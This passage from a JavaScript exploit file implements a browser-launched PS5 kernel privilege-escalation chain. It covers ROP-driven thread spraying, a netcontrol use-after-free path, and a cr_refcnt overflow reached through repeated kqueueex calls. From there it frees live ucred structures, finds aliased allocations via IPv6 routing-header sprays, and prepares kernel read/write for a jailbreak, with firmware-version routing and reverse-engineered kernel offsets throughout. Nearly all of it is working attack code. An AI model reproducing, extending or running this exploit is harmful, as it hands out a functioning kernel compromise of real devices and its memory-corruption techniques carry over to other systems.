            if (rd64at(slot.tid, 0x10) !== 0n) slot.busy = false;  // exited
            else live++;
        }
        return live;
    },

    signal(kind, cmd) {
        this.lastCmd[kind] = cmd;
        let spawned = 0;
        const n = (kind === "iov") ? IOV_THREAD_NUM : UIO_THREAD_NUM;
        const base = (kind === "iov") ? 0 : IOV_THREAD_NUM;
        this.liveCount(kind);              // refresh busy flags first
        for (let i = 0; i < n; i++) {
            const slot = rop.slots[base + i];
            /* Never reuse a slot whose thread has not published its exit.
             * ucred_triple_free's cr_refcnt loop breaks on success WITHOUT
             * draining, so IOV_THREAD_NUM threads stay blocked in recvmsg for
             * the rest of the run; rewriting their stack and ROP chain here is
             * what panicked the console. Skipping is always safe - a smaller
             * spray just costs another round. */
            if (slot.busy) continue;
            let num, a1, a2, a3;
            if (kind === "iov") {
                // recvmsg(iov_ss[0], msg_hdr, 0)
                num = SYSCALL_NUMS.recvmsg;
                a1 = S(ST.iov_ss[0]); a2 = ST.msg_hdr; a3 = 0n;
            } else if (cmd === COMMAND_UIO_READ) {
                // writev(uio_ss[1], uio_iov_read, UIO_IOV_NUM)
                num = SYSCALL_NUMS.writev;
                a1 = S(ST.uio_ss[1]); a2 = ST.uio_iov_read; a3 = S(UIO_IOV_NUM);
            } else {
                // readv(uio_ss[0], uio_iov_write, UIO_IOV_NUM)
                num = SYSCALL_NUMS.readv;
                a1 = S(ST.uio_ss[0]); a2 = ST.uio_iov_write; a3 = S(UIO_IOV_NUM);
            }
            const rv = rop.spawn(slot, num, a1, a2, a3);
            if (rv === 0) spawned++;
            if (rv !== 0 && this.warned !== true) {
                log("[!] thr_new returned " + rv + " — thread not created");
                this.warned = true;
            }
            this.pending[kind].push(slot);
        }
        /* Spawning ZERO threads is silent and fatal: no spray, so the reclaim
         * can never converge no matter how many rounds run. That is exactly
         * how the triplet[2] bug presented, so record it rather than infer it. */
        this.lastSpawn[kind] = spawned;
        return spawned;
    },

    // The threads retire on their own once unblocked; this just clears the
    // bookkeeping.
    wait(kind) { this.pending[kind].length = 0; },

    // Direction matters, and getting it wrong wedges the hijacked worker in
    // the kernel forever - which is precisely what "sync poll timed out after
    // 20000000 spins" was. A thread blocked in recvmsg(iov_ss[0]) or
    // readv(uio_ss[0]) is waiting for DATA and wakes when the PEER end is
    // written; only a thread blocked in writev(uio_ss[1]) is waiting for
    // sndbuf space and wakes when we READ. This used to read iov_ss[0], the
    // same end the readers are parked on, so nothing ever supplied data and
    // the read never returned. Every other unblock site in this file
    // (reclaim_uio, reclaim_iov_over_uio, reacquire_triplets) already had the
    // direction right - drain was the lone outlier, and the only one on the
    // path that had actually run.
    drain(kind) {
        if (kind === "iov") {
            wake_iov();                 // 1 byte, releases all of them
            barrier_iov();              // ...wait for them, as upstream does
            this.wait(kind);
            reclaim_iov();              // take the (unconsumed) byte back
            return;
        } else if (this.lastCmd.uio === COMMAND_UIO_READ) {
            read_nb(ST.uio_ss[0], ST.tmp, PAGE_SIZE);
        } else {
            write_wait(ST.uio_ss[1], ST.tmp, UIO_THREAD_NUM);
        }
        this.wait(kind);
    },
};

/* ------------------------------------------------------------------ init */

function init() {
    log("init");

    // Pin to one core, THEN take realtime priority - in that order, as
    // upstream does (Poops.java:331-332). Without both, the triple-free window
    // is lost to the scheduler on almost every attempt.
    //
    // Both return values are checked. They used to be discarded, which is how
    // the port ran for so long with prio 0 quietly returning EINVAL and no
    // realtime priority ever being granted.
    /* Per-statement trace. The renderer dies somewhere in here with no JS
     * exception - the phase markers reach "init" and stop - and static RE
     * cannot say which statement, because the failure is in the JS/ROP
     * runtime rather than in the kernel. These lines convert that into a
     * fact: whichever one is last on the wire is the statement that died.
     * They cost a synchronous beacon each and go away once it is pinned. */
    log("i1 alloc mask");
    const mask = mem.alloc(CPU_SET_SIZE);
    log("i2 mask=" + hex(mask));
    mem.bset(mask, CPU_SET_SIZE, 0);
    log("i3 bset ok");
    wr32at(mask, 0x00, 1 << MAIN_CORE);
    log("i4 mask written");

    /* The console dies here, at what is ALSO the first syscall this port ever
     * issues - so "cpuset_setaffinity is fatal" and "the ROP syscall path is
     * broken" are indistinguishable from the trace alone. getpid is 0-arg,
     * side-effect free, and its number is RE-verified, so it separates them:
     *   i4b -> i4c with a pid   = syscall path works, cpuset is the killer
     *   i4b with nothing after  = every syscall is fatal, port is unusable
     * Costs one syscall, answers a question no offline RE can. */
    log("i4b probe getpid");
    const probe = sys.getpid();
    log("i4c getpid -> " + probe);

    ST.cpu_mask = mask;                 // reused by every spawned thread's chain
    const aff = sys.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID,
                                       0xFFFFFFFFFFFFFFFFn, CPU_SET_SIZE, mask);
    /* BEACON, not log. The i1..i7 init lines are screen-only in practice -
     * "cpuset_setaffinity" has never once appeared in the host log - so we have
     * never actually confirmed the pin or the priority took. Both directly
     * affect the race win rate we have been treating as a fixed property.
     * 0 = pinned to core MAIN_CORE; anything else means we are running
     * unpinned and the UMA per-CPU argument does not hold. */
    log("i5 cpuset_setaffinity -> " + aff);

    const rtp = mem.alloc(8);
    mem.bset(rtp, 8, 0);
    // struct rtprio { u_short type; u_short prio; } — one LE u32 covers both:
    // 0x01000002 -> bytes 02 00 00 01 -> type=2, prio=0x0100=256.
    wr32at(rtp, 0x00, RTP_PRIO_REALTIME | (RTP_PRIO_VALUE << 16));
    log("i6 rtp built");
    ST.rtp = rtp;                       // ditto
    const rv = sys.rtprio_thread(RTP_SET, 0, rtp);
    log("i7 rtprio_thread -> " + rv);
    beacon("pin core=" + MAIN_CORE + " aff=" + aff + " rtprio=" + rv
           + (aff === 0 && rv === 0 ? " OK" : " <-- NOT APPLIED"));
    if (rv !== 0)
        log("[!] no realtime priority; race window will be unreliable");
    else
        log("pinned core " + MAIN_CORE + ", realtime prio " + RTP_PRIO_VALUE);

    // 0x168 exceeds lapse-runtime's 248-byte arena, so THIS is the first
    // allocation that falls into its mmap-slab path (which itself issues a
    // 6-arg mmap with only 5 args - the 6th, offset, cannot be passed:
    // "no pop_r9 gadget in libSceNKWebKit").
    log("i8 alloc spray_rthdr (first slab)");
    ST.spray_rthdr = mem.alloc(UCRED_SIZE);
    log("i9 spray_rthdr=" + hex(ST.spray_rthdr));
    ST.spray_len   = build_rthdr(ST.spray_rthdr, UCRED_SIZE);
    log("i10 rthdr built len=" + ST.spray_len);
    ST.leak_rthdr  = mem.alloc(0x400);
    ST.leak_len_ptr = mem.alloc(8);

    ST.msg_hdr = mem.alloc(MSG_HDR_SIZE);
    /* Zero the whole msghdr, not just the two fields we set below.
     *
     * mem.alloc does not zero (see the note under msg_iov), so msg_name and
     * msg_namelen carried stack garbage. That was harmless while this header
     * was only ever handed to recvmsg on the worker threads, but the cr_refcnt
     * reset now uses sendmsg, and sendit() dereferences msg_name whenever it is
     * non-NULL: a garbage pointer with a garbage length means an extra
     * getsockaddr copyin on every one of the 128 spray calls, and for any
     * length <= SOCK_MAXADDRLEN a stray malloc alongside it. The iovec spray
     * would still happen either way, but not cleanly and not identically each
     * time — and this loop's whole job is to land the same allocation on the
     * same freed chunk over and over. */
    mem.bset(ST.msg_hdr, MSG_HDR_SIZE, 0);
    ST.msg_iov = mem.alloc(0x10 * MSG_IOV_NUM);

    /* mem.alloc is rop-worker's bump allocator over the Worker stack and does
     * NOT zero, so every element we do not write carries stack garbage. That
     * is fatal here, and silently so. copyiniov (0xFFFFFFFF809AC070) is
     * permissive - it bounds only the count (<= 0x400) and copies 16*cnt bytes
     * in without looking at any length - but the resid check survived on 10.00
     * one level up, in kern_recvit (0xFFFFFFFF80767000):
     *
     *     v15 = (_QWORD *)(v12 + 8);   // &iov[0].iov_len
     *     v17 = *v15 + v16 < 0;        // signed overflow test
     *     v16 += *v15; v15 += 2;       // sum, stride 16
     *     ...  v8 = 22;                // EINVAL
     *
     * With garbage lengths in elements 1..22 that sum goes negative, recvmsg
     * returns EINVAL immediately, and the thread never blocks - no held iovec,
     * no spray, and the race cannot be won at ANY attempt count. Zeroing
     * leaves the sum at msg_iov[0].iov_len alone, which ucred_triple_free
     * sets to 1. */
    mem.bset(ST.msg_iov, 0x10 * MSG_IOV_NUM, 0);

    wr64at(ST.msg_hdr, 0x10, ST.msg_iov);       // poops.c:622
    wr64at(ST.msg_hdr, 0x18, MSG_IOV_NUM);

    // uio iovecs the worker threads hand to writev/readv (poops.c:625)
    const dummy = mem.alloc(0x1000);
    mem.bset(dummy, 0x1000, 0x41);
    ST.uio_iov_read  = mem.alloc(0x10 * UIO_IOV_NUM);
    ST.uio_iov_write = mem.alloc(0x10 * UIO_IOV_NUM);

    /* Same non-zeroing allocator, and copyinuio (0xFFFFFFFF809AC120) is
     * STRICTER than copyiniov - it does the summing itself:
     *     v15 = *v14;                        // iov_len
     *     v16 = IOSIZE_MAX();                // 0x7FFFFFFF
     *     if ( v15 > v16 - v17 ) break;      // -> free, return 22
     * so garbage in elements 1..19 makes readv/writev fail before blocking and
     * the uio spray never exists either. Element 0's iov_base is set here;
     * its iov_len is written per call by kread_slow/kwrite_slow. */
    mem.bset(ST.uio_iov_read,  0x10 * UIO_IOV_NUM, 0);
    mem.bset(ST.uio_iov_write, 0x10 * UIO_IOV_NUM, 0);

    wr64at(ST.uio_iov_read,  0x00, dummy);
    wr64at(ST.uio_iov_write, 0x00, dummy);

    ST.tmp = mem.alloc(PAGE_SIZE);

    /* Dedicated msghdr for reclaim_iov's non-blocking drain. Separate from
     * ST.msg_hdr because that one's iov array IS the spray payload and gets
     * overwritten by build_uio. */
    ST.drain_iov = mem.alloc(0x10);
    mem.bset(ST.drain_iov, 0x10, 0);
    wr64at(ST.drain_iov, 0x00, ST.tmp);
    wr64at(ST.drain_iov, 0x08, PAGE_SIZE);
    ST.drain_hdr = mem.alloc(MSG_HDR_SIZE);
    mem.bset(ST.drain_hdr, MSG_HDR_SIZE, 0);
    wr64at(ST.drain_hdr, 0x10, ST.drain_iov);
    wr64at(ST.drain_hdr, 0x18, 1);

    // gadget bases + preallocated thread slots, before anything time-critical
    rop.bind();
    rop.init(IOV_THREAD_NUM + UIO_THREAD_NUM);

    log("init done, spray_len=" + ST.spray_len);
}

function setup() {
    log("setup");

    const pair = mem.alloc(8);
    if (sys.socketpair(AF_UNIX, SOCK_STREAM, 0, pair) === -1)
        throw new Error("socketpair(iov) failed");
    ST.iov_ss = [rd32at(pair, 0) | 0, rd32at(pair, 4) | 0];

    /* iov_ss[1] is written ONLY by the main thread (the spawned threads park
     * on iov_ss[0]), so making it non-blocking cannot cost us the spray - and
     * it removes the last way a main-thread write can wedge the hijacked
     * worker in the kernel. SS_NBIO is honoured on the receive side too
     * (soreceive_generic tests so_state & 0x100 alongside MSG_DONTWAIT and
     * returns 35/EWOULDBLOCK), so this is the same mechanism, per-file.
     *
     * NOT applied to uio_ss[1]: the uio threads block in writev on that fd on
     * purpose, and O_NONBLOCK there would stop them blocking at all. */
    const one = mem.alloc(4);
    wr32at(one, 0, 1);
    sys.ioctl(ST.iov_ss[1], FIONBIO, one);

    if (sys.socketpair(AF_UNIX, SOCK_STREAM, 0, pair) === -1)
        throw new Error("socketpair(uio) failed");
    ST.uio_ss = [rd32at(pair, 0) | 0, rd32at(pair, 4) | 0];

    /* The master/victim pipe pair that make_karw converts into fast kernel R/W.
     * These were NEVER CREATED: ST.master_pipe / ST.victim_pipe stayed [0,0]
     * from their declaration, so make_karw indexed the fd table with fd 0
     * twice - reading stdin's file pointer, and would then have written a
     * forged pipebuf over it. Upstream builds them up front and makeKernelArw
     * only consumes them (kapi.getMasterPipeFd()/getVictimPipeFd()).
     *
     * That is why make_karw never completed: the two reads it does at
     * fdt_ofiles + fd*0x30 were both fd 0, and the slow read being a UAF race
     * meant one sometimes passed the address guard and the other returned
     * garbage - exactly the "non-kernel addr 0x4000000001f41" we just saw. */
    const pbuf = mem.alloc(8);
    if (sys.pipe(pbuf) === -1) throw new Error("pipe(master) failed");
    ST.master_pipe = [rd32at(pbuf, 0) | 0, rd32at(pbuf, 4) | 0];
    if (sys.pipe(pbuf) === -1) throw new Error("pipe(victim) failed");
    ST.victim_pipe = [rd32at(pbuf, 0) | 0, rd32at(pbuf, 4) | 0];
    if (!ST.master_pipe[0] || !ST.victim_pipe[0])
        throw new Error("pipe fds came back 0: master="
                        + ST.master_pipe.join("/") + " victim="
                        + ST.victim_pipe.join("/"));
    /* Report arena usage too. Our bump allocator lives in the Worker's 0x80000
     * stack with a 0x70000 ceiling, and the 8 thread slots alone take ~304 KB,
     * so it is worth knowing how close we run - an exhausted arena throws a
     * named error, but a nearly-full one is a warning we would otherwise only
     * discover by tripping it. This is separate from the browser-side OOM,
     * which is SceNKWebProcess heap and not ours. */
    const rw0 = window.rop_worker;
    beacon("pipes master=" + ST.master_pipe.join("/")
           + " victim=" + ST.victim_pipe.join("/")
           + " arena=" + (rw0 && rw0.allocUsed ? rw0.allocUsed() : "?")
           + "/" + 0x70000);

    for (let i = 0; i < IPV6_SOCK_NUM; i++) {
        ST.ipv6_socks[i] = sys.socket(AF_INET6, SOCK_STREAM, 0);
        if (ST.ipv6_socks[i] === -1)
            throw new Error("socket(AF_INET6) failed at " + i);
    }

    threads.spawn("iov", IOV_THREAD_NUM);
    threads.spawn("uio", UIO_THREAD_NUM);

    // NOTE: the verbose cfg/fds/buf setup dump beacons were REMOVED 2026-08-08 —
    // they added ~3 HTTP round-trips of latency into the pre-double-free path
    // that the landed historical runs never had, a possible groom perturbation
    // during a self=all miss streak. The in-loop nz/tag/self counters and the
    // fail-fast stay (they are timing-neutral / round-boundary only).

    // [PS5] poops.c:660 — clear every rthdr before triggering. The PS4 chain
    // skips this and it is one reason a straight port mis-aliases.
    for (let i = 0; i < IPV6_SOCK_NUM; i++) free_rthdr(ST.ipv6_socks[i]);

    log("setup done");
}

/* ------------------------------------------------------- alias discovery */

// [PS5] tagged scan, poops.c:556. The tag's high half is validated so a stale
// or uninitialised buffer cannot masquerade as a valid alias index.
function find_twins() {
    log("find_twins");
    let nz = 0, tag = 0, self = 0, lastVal = 0;
    for (let a = 0; a < TWIN_ATTEMPTS; a++) {
        // distinguishes "slow but advancing" from "wedged" without perturbing
        // the race much: ~20 beacons across the whole attempt budget.
        // nz/tag/self/last: see find_triplet — same overlap-health signals.
        if (a && (a & 0xFF) === 0)
            beacon("find_twins round " + a + " nz=" + nz + " tag=" + tag
                   + " self=" + self + " last=0x" + lastVal.toString(16));
        for (let i = 0; i < IPV6_SOCK_NUM; i++) {
            wr32at(ST.spray_rthdr, 0x04, (RTHDR_TAG | i) >>> 0);
            set_rthdr(ST.ipv6_socks[i], ST.spray_rthdr, ST.spray_len);
        }
        for (let i = 0; i < IPV6_SOCK_NUM; i++) {
            /* Clear before reading: getsockopt(IPV6_RTHDR) copies NOTHING
             * when ip6po_rthdr is NULL and only 8 bytes when the chunk is
             * zeroed (ip6_ctloutput 0xFFFFFFFF80862BA0), so an unclear buffer
             * scores the PREVIOUS iteration's tag - a false positive that
             * would hand us a wrong twin/triplet index. */
            wr32at(ST.leak_rthdr, 0x04, 0);
            setLeakLen(8);
            get_rthdr(ST.ipv6_socks[i], ST.leak_rthdr, ST.leak_len_ptr);
            const val = rd32at(ST.leak_rthdr, 0x04);
            if (val) { nz++; lastVal = val; }
            const j = val & 0xFFFF;
            if ((val & 0xFFFF0000) === (RTHDR_TAG >>> 0)) { tag++; if (i === j) self++; }
            if ((val & 0xFFFF0000) === (RTHDR_TAG >>> 0) && i !== j &&
                j < IPV6_SOCK_NUM) {
                ST.twins = [i, j];
                beacon("twins FOUND " + i + "/" + j + " round=" + a + " nz=" + nz
                       + " tag=" + tag);
                log("twins " + i + "/" + j + " after " + a + " rounds");
                return true;
            }
        }
    }
    beacon("twins EXHAUSTED rounds=" + TWIN_ATTEMPTS + " nz=" + nz + " tag=" + tag
           + " self=" + self + " last=0x" + lastVal.toString(16));
    return false;
}

/* Double-free + first spray round in ONE worker chain (one wake) so the close
 * (free trigger) and the 150 rthdr sprays run on the SAME core - the freed ucred
 * lands in that core's per-CPU bucket and the same-core sprays reclaim it,
 * forming a twin DETERMINISTICALLY instead of relying on the worker not migrating
 * between separate syscalls (the self=all cause; RE: uma_zalloc curcpu<<6, and
 * the batched calls are all M_NOWAIT so the worker never parks mid-chain). Falls
 * back to the per-round find_twins() loop if the single batched round misses. */
/* ==========================================================================
 * p2jb — cr_refcnt overflow.  For 12.02 .. 12.70, where netcontrol is fixed.
 *
 * Ported from ufm42/cobolt's p2jb.js. Only the ROUTE TO THE DOUBLE FREE differs
 * from the netcontrol chain; everything downstream — find_twins, find_triplet,
 * leak_kqueue, make_karw, find_allproc, ps5_jailbreak, the elfldr loader — is
 * shared, because both exploits end at the same place: one ucred chunk sitting
 * on the free list more than once.
 *
 * The bug (verified in kernel_1202, sys_kqueueex @0xFFFFFFFF805D4CC0):
 *   malloc(0x128) the kqueue, then
 *     mov rdi, r14        ; r14 = td_ucred
 *     call crhold
 *     mov [r15+0xF0], rax ; kq->kq_cred
 *     mov r14, [r13]      ; r13 = uap  ->  the flags argument
 *     test r14, r14
 *     je  ...             ; non-zero flags take a path that errors out
 *   and that error path never crfree()s kq_cred. So each kqueueex(non-zero)
 *   leaks exactly one cred reference and allocates nothing that has to be
 *   cleaned up.
 *
 * Drive cr_refcnt to 0xFFFFFFB0, open 0x50 files (each crhold's, +0x50) so it
 * wraps to exactly 0, then setuid(1). FreeBSD's refcount_release treats old<=1
 * as "last reference", so releasing at 0 FREES the ucred while 0x50 files still
 * point at it — and every subsequent close() frees it again.
 *
 * Cost: 0xFFFFFFB0 is ~4.29 BILLION syscalls. cobolt spends ~50 minutes on it
 * with four pinned threads and says so up front; this is not a fast path and
 * there is no way to make it one.
 * ====================================================================== */

/* The three kernel bugs partition the supported range exactly — every firmware
 * belongs to one and only one of them, so routing is a set lookup rather than a
 * comparison. 13.x is absent from all three: nothing here has been checked
 * against those kernels.
 *
 *   lapse    09.00 - 10.01   aio double free      (lapse-ps5.js)
 *   netctrl  10.20 - 12.00   netcontrol UAF       (this file)  [aka "poops"]
 *   p2jb     12.02 - 12.70   cr_refcnt overflow   (this file)
 */
const LAPSE_FIRMWARES_KERNEL =
    new Set(["09.00", "09.20", "09.40", "09.60", "10.00", "10.01"]);
const NETCTRL_FIRMWARES =
    new Set(["10.20", "10.40", "10.60", "11.00", "11.20", "11.40", "11.60", "12.00"]);
const P2JB_FIRMWARES = new Set(["12.02", "12.20", "12.40", "12.60", "12.70"]);
const sk_fw = () => String((window.slopkit && window.slopkit.FW_VERSION) || "");

const P2JB_TARGET      = 0xFFFFFFB0n;   // cr_refcnt value to stop at
const P2JB_NUM_FDS     = 0x50;          // opens that carry it across the wrap
const P2JB_THREADS     = 4;
const P2JB_CALLS_PASS  = 0x200;         // kqueueex calls per loop pass
const KQUEUEEX_FLAG    = 0x800000000000n;
const P2JB_FINE_BATCH  = 0x800;         // top-up batch size, main thread
const O_RDONLY         = 0;

/* One self-looping ROP chain per spinner thread.
 *
 * cobolt's loop branches inside the chain with `cmovb rax, rsi` + `xchg rsp,
 * rax`, and counts with `lock xadd [rdi], rax`. None of those exist in
 * libSceNKWebKit or libkernel_web on ANY firmware — scanned for lock xadd,
 * xadd, add [rdi],rax, inc qword [rdi], cmovb, xchg rsp,rax and sub rdx,rax:
 * zero hits. So the loop is rebuilt from what we do have:
 *
 *   loop-back   `pop rdi, <addr>; mov rsp, rdi; ret`  — the pivot lands rsp on
 *               the loop head and the ret enters it. The <addr> is an immediate
 *               IN the chain, so the main thread stops the loop by overwriting
 *               that one qword with the exit stub's address. A single aligned
 *               store the chain only ever reads; the thread sees either the old
 *               or the new value and both are valid.
 *   counter     load / inc / store via mov_rax_deref_rdi + inc_rax +
 *               mov_qword_rdi_rax. Non-atomic, which is fine because each
 *               thread owns its own counter — the main thread sums them.
 *
 * Counting PASSES rather than calls keeps the counter overhead at 5 gadgets per
 * P2JB_CALLS_PASS syscalls instead of per syscall. */
function p2jbBuildSpinner(slot) {
    const c = slot.chain;
    let o = 0n;
    const put = (v) => { wr64at(c, o, BigInt(v)); o += 8n; };
    const g = (n) => rop.g(n);

    // pin + realtime, exactly as the iov/uio spray threads do. Here it is not
    // optional: the whole point is four threads each saturating one core.
    put(g("pop_rdi")); put(BigInt(CPU_LEVEL_WHICH));
    put(g("pop_rsi")); put(BigInt(CPU_WHICH_TID));
    put(g("pop_rdx")); put(0xFFFFFFFFFFFFFFFFn);
    put(g("pop_rcx")); put(BigInt(CPU_SET_SIZE));
    put(g("pop_r8"));  put(slot.mask);
    put(g("pop_rax")); put(SYSCALL_NUMS.cpuset_setaffinity);
    put(g("syscall_wrapper"));
    put(g("pop_rdi")); put(BigInt(RTP_SET));
    put(g("pop_rsi")); put(0n);
    put(g("pop_rdx")); put(ST.rtp);
    put(g("pop_rax")); put(SYSCALL_NUMS.rtprio_thread);
    put(g("syscall_wrapper"));

    const loopHead = BigInt(c) + o;          // where the pivot must land

    for (let i = 0; i < P2JB_CALLS_PASS; i++) {
        put(g("pop_rax")); put(SYSCALL_NUMS.kqueueex);
        put(g("pop_rdi")); put(KQUEUEEX_FLAG);
        put(g("syscall_wrapper"));
    }

    // counter += 1  (per pass)
    put(g("pop_rdi")); put(slot.counter);
    put(g("mov_rax_deref_rdi"));
    put(g("inc_rax"));
    put(g("pop_rdi")); put(slot.counter);
    put(g("mov_qword_rdi_rax"));

    // loop back — this immediate is the stop switch
    put(g("pop_rdi"));
    slot.loopSlot = BigInt(c) + o;           // main thread patches HERE
    put(loopHead);
    put(g("pivot_rdi_rsp"));

    // exit stub, jumped to when loopSlot is repointed at it
    slot.exitAddr = BigInt(c) + o;
    put(g("pop_rax")); put(SYSCALL_NUMS.thr_exit);
    put(g("pop_rdi")); put(0n);
    put(g("syscall_wrapper"));

    slot.chainBytes = Number(o);
    slot.loopHead = loopHead;
    return slot;
}

function p2jbSpin() {
    const slots = [];
    // Chain size is fixed by P2JB_CALLS_PASS; allocate from the same worker
    // stack arena everything else uses, before the KRW stage has eaten it.
    const chainBytes = (P2JB_CALLS_PASS * 5 + 64) * 8;
    for (let i = 0; i < P2JB_THREADS; i++) {
        const mask = mem.alloc(CPU_SET_SIZE);
        mem.bset(mask, CPU_SET_SIZE, 0);
        wr32at(mask, 0x00, 1 << i);            // one thread per core, 0..3
        const slot = {
            mask: BigInt(mask),
            counter: BigInt(mem.alloc(8)),
            chain: mem.alloc(chainBytes),
            param: mem.alloc(THR_PARAM_SIZE),
            stack: mem.alloc(THR_STACK_SIZE),
            tid: mem.alloc(0x18),
        };
        R.wr64(slot.counter, 0n);
        mem.bset(slot.tid, 0x18, 0);
        p2jbBuildSpinner(slot);
        slots.push(slot);
    }

    for (const s of slots) {
        const p = s.param;
        mem.bset(p, THR_PARAM_SIZE, 0);
        wr64at(p, 0x00, rop.g("pivot_rdi_rsp"));   // start_func: rsp := arg
        wr64at(p, 0x08, BigInt(s.chain));          // arg -> rdi -> the chain
        wr64at(p, 0x10, s.stack);
        wr64at(p, 0x18, BigInt(THR_STACK_SIZE));
        wr64at(p, 0x30, s.tid);
        wr64at(p, 0x38, s.tid);
        const rv = invoke("thr_new", p, BigInt(THR_PARAM_SIZE));
        if (rv !== 0) throw new Error("p2jb: thr_new -> " + rv);
    }
    beacon("p2jb spinners=" + P2JB_THREADS + " calls/pass=0x"
           + P2JB_CALLS_PASS.toString(16) + " target=" + hex(P2JB_TARGET));

    const total = () => {
        let n = 0n;
        for (const s of slots) n += R.rd64(s.counter);
        return n * BigInt(P2JB_CALLS_PASS);
    };

    /* Stop early enough that no thread can overshoot the target while
     * finishing the pass it is already in: worst case every thread is one full
     * pass from committing. The exact remainder is issued from this thread
     * afterwards, where the count is precise. */
    const slack = BigInt(P2JB_THREADS * P2JB_CALLS_PASS * 2);
    const stopAt = P2JB_TARGET - slack;
    const t0 = Date.now();
    let lastLog = 0n;
    for (;;) {
        const n = total();
        if (n >= stopAt) break;
        const step = n >> 24n;
        if (step !== lastLog) {
            lastLog = step;
            const el = (Date.now() - t0) / 1000;
            beacon("p2jb cr_refcnt~" + hex(n) + " " + Math.round(el) + "s"
                   + " rate=" + Math.round(Number(n) / Math.max(el, 1)) + "/s");
        }
    }

    // flip every loop-back to the exit stub, then wait for the threads to go
    for (const s of slots) R.wr64(s.loopSlot, s.exitAddr);
    for (let i = 0; i < 4000000; i++) {
        let live = 0;
        for (const s of slots) if (rd64at(s.tid, 0x10) === 0n) live++;
        if (!live) break;
    }
    const done = total();
    beacon("p2jb spinners stopped at " + hex(done) + " after "
           + Math.round((Date.now() - t0) / 1000) + "s");
    return done;
}

/* Issue the exact remainder from this thread, where every call is counted. */
function p2jbTopUp(from) {
    let n = from;
    while (n < P2JB_TARGET) {
        const want = Number(P2JB_TARGET - n);
        const k = Math.min(want, P2JB_FINE_BATCH);
        const batch = [];
        for (let i = 0; i < k; i++)
            batch.push([Number(SYSCALL_NUMS.kqueueex), KQUEUEEX_FLAG]);
        window.rop_worker.syscallBatch(batch);
        n += BigInt(k);
    }
    beacon("p2jb topped up to " + hex(n));
    return n;
}

function ucred_triple_free_p2jb() {
    log("p2jb: cr_refcnt overflow");

    /* poll's spray buffer: nfds = UCRED_SIZE/8 makes sys_poll allocate exactly
     * UCRED_SIZE and copy this in, so byte 0 = 1 lands on cr_refcnt. */
    const nfds = UCRED_SIZE / 8;
    const pollbuf = mem.alloc(UCRED_SIZE);
    mem.bset(pollbuf, UCRED_SIZE, 0);
    wr32at(pollbuf, 0x00, 1);
    const resetRefcnt = (rounds) => {
        const batch = [];
        for (let i = 0; i < rounds; i++)
            batch.push([Number(SYSCALL_NUMS.poll), BigInt(pollbuf), S(nfds), 0n]);
        window.rop_worker.syscallBatch(batch);
    };

    const uid0 = sys.getuid();
    const su = sys.setuid(1);                      // fresh ucred to overflow
    beacon("p2jb setuid uid=" + uid0 + " -> " + su);
    if (su !== 0)
        throw new Error("ERR_P2JB: setuid(1) failed (" + su + ") from uid " + uid0);

    const spun = p2jbSpin();
    p2jbTopUp(spun);

    // Each open crhold()s the cred; 0x50 of them carry 0xFFFFFFB0 to 0 exactly.
    const path = mem.alloc(0x20);
    mem.bset(path, 0x20, 0);
    const s = "/dev/null";
    for (let i = 0; i < s.length; i++) R.wr8(BigInt(path), i, s.charCodeAt(i));
    const fds = [];
    for (let i = 0; i < P2JB_NUM_FDS; i++) {
        const fd = sys.open(path, O_RDONLY, 0);
        if (fd < 0) throw new Error("ERR_P2JB: open(/dev/null) -> " + fd);
        fds.push(fd);
    }
    beacon("p2jb opened " + fds.length + " fds; cr_refcnt should have wrapped to 0");

    // Release at 0 -> refcount_release sees old <= 1 -> frees a LIVE ucred.
    const su2 = sys.setuid(1);
    beacon("p2jb setuid#2 -> " + su2 + " (frees the still-referenced ucred)");
    if (su2 !== 0) throw new Error("ERR_P2JB: setuid#2 failed " + su2);

    try { sessionStorage.setItem("netctrl_dirty", "1"); } catch (e) {}

    /* Each close() frees the same chunk again. Reset cr_refcnt to 1 around each
     * one and look for twins; cobolt walks the fd list the same way because any
     * single close may or may not be the one that surfaces an aliased pair. */
    while (fds.length) {
        const fd = fds.pop();
        try {
            resetRefcnt(0x20);
            if (sys.close(fd) !== 0) continue;
            resetRefcnt(0x20);
            if (find_twins()) {
                beacon("p2jb twins " + ST.twins.join("/") + " (fd " + fd + ")");
                ST.triplets[0] = ST.twins[0];
                free_rthdr(ST.ipv6_socks[ST.twins[1]]);
                resetRefcnt(0x20);
                const fd1 = fds.pop();
                if (fd1 !== undefined) sys.close(fd1);   // the third free
                const t1 = find_triplet(ST.triplets[0], -1);
                if (t1 < 0) throw new Error("ERR_P2JB: triplet[1] not found");
                ST.triplets[1] = t1;
                const t2 = find_triplet(ST.triplets[0], ST.triplets[1]);
                if (t2 < 0) throw new Error("ERR_P2JB: triplet[2] not found");
                ST.triplets[2] = t2;
                beacon("p2jb triplets " + ST.triplets.join("/"));
                return true;
            }
        } catch (e) {
            beacon("p2jb fd " + fd + ": " + e.message);
        }
    }
    throw new Error("ERR_P2JB: no twins after closing all " + P2JB_NUM_FDS + " fds");
}

function doubleFreeAndFindTwins() {
    /* A single batched free+spray round was tried and REVERTED: RE (uma_zfree
     * bucket push @0x8068B8E0) showed the freed ucred lands in the free-core's
     * FREEBUCKET and is not allocatable until that bucket FILLS and flushes to
     * the keg - one same-core spray round never surfaces it (observed nz=150
     * tag=150 with ZERO twins). Forcing the flush needs a multi-phase
     * close+spray+free+respray batch that exceeds BATCH_CAP, so it cannot run in
     * one same-core chain. find_twins accumulates the frees across rounds and
     * lands stochastically (~1/3), which is the practical optimum here. Keep the
     * proven tight-window inline double-free. */
    // Immediate find_twins, no settle between - matches upstream BD-JB5
    // Poops.java (close(dup(uafSock)) then findTwins() with no delay). The real
    // lever is TWIN_ATTEMPTS=5000 (restored above), not a settle.
    /* dup's result was discarded as well. If it returns -1 (uaf_sock already
     * torn down, or the fd table in an unexpected state) then close(-1) is a
     * no-op, nothing is freed, and find_twins grinds against a chunk that was
     * never released — self=all again, with nothing in the log to say why.
     * Upstream checks it; the cost here is one comparison. */
    const dupfd = sys.dup(ST.uaf_sock);
    if (dupfd < 0) {
        beacon("double free: dup(" + ST.uaf_sock + ") -> " + dupfd);
        throw new Error("ERR_TRIPLE_FREE: dup(uaf_sock) returned " + dupfd
                        + " — nothing was freed, so no twins can exist");
    }
    sys.close(dupfd);                              // the double free
    return find_twins();
}

function find_triplet(master, other) {      // poops.c:593
    /* The only stage that legitimately takes minutes: 150 setsockopt per
     * attempt for ONE check, so at the measured 0.220 ms/syscall its worst
     * case is ~166 s per call and there are two calls. Without a progress
     * beacon that is indistinguishable from a wedge, which is exactly how it
